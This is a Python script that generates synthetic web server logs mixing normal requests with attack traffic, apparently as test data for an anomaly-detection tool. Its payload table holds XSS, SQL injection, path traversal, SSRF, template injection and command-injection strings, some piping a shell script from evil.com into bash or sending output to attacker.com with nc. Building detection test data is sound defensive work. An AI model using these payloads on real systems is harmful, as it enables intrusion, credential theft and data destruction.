"""
Advanced Synthetic Threat Log Generator
Generates realistic logs with all threat types for training

IMPORTANT: For best results, train models on CLEAN traffic only!
- Use this file to generate mixed traffic for testing
- For training, filter out attacks or generate separate clean dataset
"""
import random
from datetime import datetime, timedelta

OUTPUT_FILE = "advanced_synthetic_logs.log"
TOTAL_RECORDS = 1000
ANOMALY_RATIO = 0.2  # 25% threats (for testing)

# For training, set ANOMALY_RATIO = 0.0 to generate only clean traffic

HOSTNAME = "servernameabc"
DOMAIN = "abc.example.net"
REFERRER = "https://abc.example.com/"

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) Chrome/144.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) Safari/537.36",
    "Mozilla/5.0 (X11; Linux x86_64) Firefox/105.0",
    "sqlmap/1.5.2",
    "nikto/2.1.6",
    "nmap/7.92",
    "python-requests/2.28.0",
    "curl/7.68.0"
]

NORMAL_PATHS = [
    "/content/dam/company-2026/january/010_PR_gridd.jpg",
    "/homePage/rest/common-data/event_list",
    "/DataValidation/rest/my-teams/team-member-counts?input_year=2025-2026",
    "/api/v1/users/profile",
    "/static/css/main.css",
    "/static/js/app.js",
    "/images/logo.png",
    "/images/banner.jpg",
    "/api/health",
    "/api/status",
    "/dashboard/analytics",
    "/dashboard/reports",
    "/api/v1/products/list",
    "/api/v1/orders/recent",
    "/content/articles/2026/tech-news.html"
]

# Comprehensive attack payloads covering all threat types
ATTACK_PAYLOADS = {
    "XSS": [
        '/search?q=<script>alert(1)</script>',
        '/comment?text=<img src=x onerror=alert(1)>',
        '/profile?name=<svg onload=alert(1)>',
        '/feedback?msg=<iframe src=javascript:alert(1)>',
        '/post?content=<body onload=alert(document.cookie)>',
        '/search?term=<script>document.location="http://evil.com"</script>',
        '/input?data=<img src=x onerror=eval(atob("YWxlcnQoMSk="))>',
        '/form?field=<svg/onload=alert(1)>',
        '/page?html=<script src=http://evil.com/xss.js></script>',
        '/view?content=javascript:alert(String.fromCharCode(88,83,83))'
    ],
    "SQLi": [
        "/login?user=admin' OR '1'='1",
        "/search?id=1 UNION SELECT * FROM users--",
        "/api/user?id=1' AND 1=1--",
        "/product?id=1' UNION SELECT username,password FROM admin--",
        "/query?search=test' OR 1=1; DROP TABLE users--",
        "/login?username=admin'--&password=anything",
        "/api/data?filter=1' UNION ALL SELECT NULL,NULL,NULL--",
        "/search?q=1' AND (SELECT COUNT(*) FROM users) > 0--",
        "/item?id=1' UNION SELECT @@version--",
        "/page?id=1' OR '1'='1' /*"
    ],
    "PathTraversal": [
        "/../../etc/passwd",
        "/download?file=../../../../etc/shadow",
        "/view?path=..%2f..%2f..%2fetc%2fpasswd",
        "/read?file=../../../windows/system32/config/sam",
        "/get?path=....//....//....//etc/passwd",
        "/file?name=..%252f..%252f..%252fetc%252fpasswd",
        "/download?doc=../../../../../../etc/hosts",
        "/include?page=....//....//....//proc/self/environ",
        "/load?file=..\\..\\..\\windows\\win.ini",
        "/fetch?resource=file:///etc/passwd"
    ],
    "LFI": [
        "/index.php?page=../../../../etc/shadow",
        "/read?file=../../../../../../windows/system32/config/sam",
        "/view.php?template=../../../etc/passwd",
        "/load?module=php://filter/convert.base64-encode/resource=index.php",
        "/include?file=/proc/self/environ",
        "/page?view=../../../var/log/apache2/access.log"
    ],
    "SSRF": [
        "/fetch?url=http://169.254.169.254/latest/meta-data/",
        "/proxy?url=http://localhost:8080/admin",
        "/redirect?url=http://127.0.0.1:22",
        "/webhook?callback=http://169.254.169.254/latest/user-data",
        "/api/fetch?target=http://metadata.google.internal/computeMetadata/v1/",
        "/load?resource=http://localhost:6379/",
        "/import?source=http://0.0.0.0:3306/",
        "/check?endpoint=http://[::1]:8080/admin"
    ],
    "RCE": [
        "/run?cmd=whoami",
        "/exec?command=cat /etc/passwd",
        "/shell?cmd=ls -la",
        "/system?exec=id",
        "/execute?code=system('uname -a')",
        "/eval?expr=__import__('os').system('whoami')"
    ],
    "CommandInjection": [
        "/ping?ip=127.0.0.1; cat /etc/passwd",
        "/lookup?host=google.com && whoami",
        "/trace?target=8.8.8.8 | bash",
        "/nslookup?domain=example.com; ls -la",
        "/dig?query=test.com && cat /etc/shadow",
        "/whois?domain=test.com | nc attacker.com 4444",
        "/resolve?host=localhost; rm -rf /tmp/*",
        "/check?server=127.0.0.1 && curl http://evil.com/shell.sh | bash"
    ],
    "OpenRedirect": [
        "/redirect?url=http://evil.com",
        "/goto?next=//attacker.com",
        "/return?to=https://phishing.site",
        "/forward?destination=http://malicious.com",
        "/link?target=//evil.com/phishing",
        "/navigate?url=javascript:alert(1)"
    ],
    "IDOR": [
        "/api/user/999999",
        "/profile/888888",
        "/account?id=777777",
        "/order/666666",
        "/invoice/555555",
        "/document/444444",
        "/api/admin/user/123456",
        "/private/file/987654"
    ],
    "SSTI": [
        "/render?template={{7*7}}",
        "/view?page=${7*7}",
        "/template?data=<%= 7*7 %>",
        "/compile?expr={{config.items()}}",
        "/process?input={{''.__class__.__mro__[1].__subclasses__()}}",
        "/generate?template={{request.application.__globals__.__builtins__.__import__('os').popen('id').read()}}"
    ],
    "SensitiveDisclosure": [
        "/.env",
        "/.git/config",
        "/config.php",
        "/credentials.txt",
        "/backup.sql",
        "/.aws/credentials",
        "/web.config",
        "/.htpasswd",
        "/phpinfo.php",
        "/server-status",
        "/.svn/entries",
        "/WEB-INF/web.xml",
        "/admin/config.json"
    ],
    "PrivilegeEscalation": [
        "/admin/users",
        "/api/admin/delete",
        "/system/role?role=admin",
        "/user/promote?id=123&role=administrator",
        "/api/v1/users/123/permissions?admin=true",
        "/account/upgrade?level=superuser",
        "/CFIDE/administrator/index.cfm"
    ],
    "DataExfiltration": [
        "/export/all",
        "/download/database",
        "/backup/full",
        "/api/users/export?format=csv",
        "/data/dump?table=*",
        "/admin/export/customers",
        "/api/backup/download?type=full"
    ]
}


def random_ip():
    """Generate random internal IP"""
    return f"10.{random.randint(1,255)}.{random.randint(1,255)}.{random.randint(1,255)}"


def generate_log(timestamp, anomaly=False):
    """Generate a single log entry"""
    ip = random_ip()
    proxy_ip = "0.1.0.1"
    port = random.randint(10000, 60000)
    pid = random.randint(1000, 9999)
    agent = random.choice(USER_AGENTS[:3])  # Normal agents by default
    
    if anomaly:
        attack_type = random.choice(list(ATTACK_PAYLOADS.keys()))
        attack = random.choice(ATTACK_PAYLOADS[attack_type])
        method = random.choice(["GET", "POST"])
        uri = attack
        status = random.choice([200, 401, 403, 404, 500, 302])
        size = random.randint(100, 2000000) if "Exfiltration" in attack_type else random.randint(100, 5000)
        duration = random.randint(50, 2000)
        
        # Use attack-specific user agents for some attacks
        if random.random() < 0.4:
            agent = random.choice(USER_AGENTS[3:])  # Attack tools
    else:
        uri = random.choice(NORMAL_PATHS)
        method = random.choice(["GET", "GET", "GET", "POST"])  # Mostly GET
        status = random.choice([200, 200, 200, 200, 304, 404])  # Mostly 200
        size = random.randint(2000, 80000)
        duration = random.randint(5, 50)
    
    syslog_time = timestamp.strftime("%b %d %H:%M:%S")
    apache_time = timestamp.strftime("%d/%b/%Y:%H:%M:%S +0530")
    
    log = (
        f'<150>{syslog_time} {HOSTNAME} httpd[{pid}]: '
        f'{ip} {proxy_ip} {port} {DOMAIN} - - '
        f'[{apache_time}] "{method} {uri} HTTP/1.1" '
        f'{status} - {duration} "{REFERRER}" "{agent}"'
    )
    
    return log


if __name__ == "__main__":
    START_TIME = datetime(2026, 1, 28, 8, 0, 0)
    current_time = START_TIME
    logs = []
    
    print(f"Generating {TOTAL_RECORDS} log entries...")
    print(f"Attack ratio: {ANOMALY_RATIO * 100:.0f}%")
    
    for i in range(TOTAL_RECORDS):
        is_anomaly = random.random() < ANOMALY_RATIO
        logs.append(generate_log(current_time, is_anomaly))
        current_time += timedelta(seconds=random.randint(1, 3))
    
    with open(OUTPUT_FILE, "w") as f:
        for line in logs:
            f.write(line + "\n")
    
    print(f"\n✓ Generated {TOTAL_RECORDS} logs in {OUTPUT_FILE}")
    print(f"  - Normal traffic: {int(TOTAL_RECORDS * (1 - ANOMALY_RATIO))} records")
    print(f"  - Attack traffic: {int(TOTAL_RECORDS * ANOMALY_RATIO)} records")
    print(f"\n📋 Next steps:")
    print(f"  1. For TRAINING: Set ANOMALY_RATIO = 0.0 and regenerate (clean data only)")
    print(f"  2. Run: python retrain_models.py")
    print(f"  3. For TESTING: Use this file with mixed traffic")
    print(f"  4. Upload {OUTPUT_FILE} in the web interface")
